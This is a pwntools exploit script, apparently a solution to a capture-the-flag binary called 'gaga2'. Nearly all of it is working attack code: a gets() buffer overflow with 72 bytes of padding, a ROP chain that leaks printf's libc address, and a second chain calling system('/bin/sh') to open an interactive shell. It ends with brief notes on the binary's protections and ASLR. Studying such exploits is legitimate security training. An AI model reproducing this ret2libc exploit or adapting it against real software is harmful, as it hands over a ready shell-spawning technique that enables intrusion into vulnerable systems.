#!/usr/bin/env python3

from pwn import *

exe = './gaga2'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

libc =ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

#host,port = '',

p = process(exe)
#p = remote(host,port)

rop = ROP(elf)

padding = 72 

pop_rdi =0x00000000004012b3 # ropper --file gaga2 --search "pop rdi"
ret = 0x000000000040101a

rop.puts(elf.got["printf"])
rop.main()

print(rop.dump())

p.sendlineafter(b'input: ',padding*b'A'+rop.chain())
data = p.recvline()
print(f"{data=}")

libc_leak = u64(data.ljust(8,b"\x00"))
print(f"{hex(libc_leak)=}")
libc.address = libc_leak - libc.symbols["printf"]
print(f"{hex(libc.address)=}")

#system = libc.symbols.system
#bin_sh = next(libc.search(b"/bin/sh"))

#info("System: %x",system)
#info("bin_sh: %x",bin_sh)


rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
rop.system(next(libc.search(b"/bin/sh")))

print(rop.dump())

p.sendlineafter(b'input: ',padding*b'A'+rop.chain())
p.interactive()

'''
payload = flat(
    asm('nop')*padding,#padding to reach EIP
    ret,
    pop_rdi,
    bin_sh,
    system,
)

p.sendlineafter(b'input: ',payload)
p.interactive()
'''


'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

No useful function so is probably return to libc
dangerous gets() function so we can buffer overflow attack.
We need to leak libc base address because ASLR is on and therefore base address of libc will keep changing so we need to leak it somehow
We can confirm in gdb if base address of libc is changing by
$break main
$run
$vmmap

$got -r
'''
